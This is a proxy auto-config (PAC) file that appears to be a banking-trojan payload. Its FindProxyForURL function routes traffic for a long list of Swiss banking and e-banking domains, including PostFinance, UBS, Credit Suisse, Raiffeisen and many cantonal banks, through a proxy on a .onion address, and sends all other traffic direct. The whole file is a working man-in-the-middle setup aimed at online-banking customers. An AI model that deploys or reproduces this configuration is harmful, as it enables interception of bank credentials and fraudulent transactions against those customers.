function FindProxyForURL(url, host) {
    var proxy = "PROXY xho7gzpqwnw7awoc.onion:88;";
    var hosts = new Array('*.postfinance.ch', 'cs.directnet.com', '*akb.ch',
        '*.ubs.com', 'tb.raiffeisendirect.ch', '*.bkb.ch', '*.lukb.ch',
        '*.zkb.ch', '*.onba.ch', '*gkb.ch', '*.bekb.ch', '*zugerkb.ch',
        '*bcge.ch', '*.raiffeisen.ch', '*.credit-suisse.com',
        '*.clientis.ch', 'clientis.ch', '*bcvs.ch', '*.cic.ch', 'cic.ch',
        '*baloise.ch', 'ukb.ch', '*.ukb.ch', 'urkb.ch', '*.urkb.ch',
        '*.eek.ch', '*szkb.ch', '*shkb.ch', '*glkb.ch', '*nkb.ch',
        '*owkb.ch', '*cash.ch', '*bcf.ch', 'ebanking.raiffeisen.ch',
        '*bcv.ch', '*juliusbaer.com', '*abs.ch', '*bcn.ch', '*blkb.ch',
        '*bcj.ch', '*zuercherlandbank.ch', '*valiant.ch', '*wir.ch',
        '*bankthalwil.ch', '*piguetgalland.ch', '*triba.ch', '*inlinea.ch',
        '*bernerlandbank.ch', '*bancasempione.ch', '*bsibank.com',
        '*corneronline.ch', '*vermoegenszentrum.ch', '*gobanking.ch',
        '*slbucheggberg.ch', '*slfrutigen.ch', '*hypobank.ch',
        '*regiobank.ch', '*rbm.ch', '*hbl.ch', '*ersparniskasse.ch',
        '*ekr.ch', '*sparkasse-dielsdorf.ch', '*eki.ch',
        '*bankgantrisch.ch', '*bbobank.ch', '*alpharheintalbank.ch',
        '*aekbank.ch', '*acrevis.ch', '*credinvest.ch',
        '*bancazarattini.ch', '*appkb.ch', '*arabbank.ch', '*apbank.ch',
        '*notenstein-laroche.ch', '*bankbiz.ch', '*bankleerau.ch',
        '*btv3banken.ch', '*dcbank.ch', '*bordier.com', '*banquethaler.com',
        '*bankzimmerberg.ch', '*bbva.ch');
    for (var i = 0; i < hosts.length; i++) {
        if (shExpMatch(host, hosts[i])) {
            return proxy
        }
    }
    return "DIRECT"
}
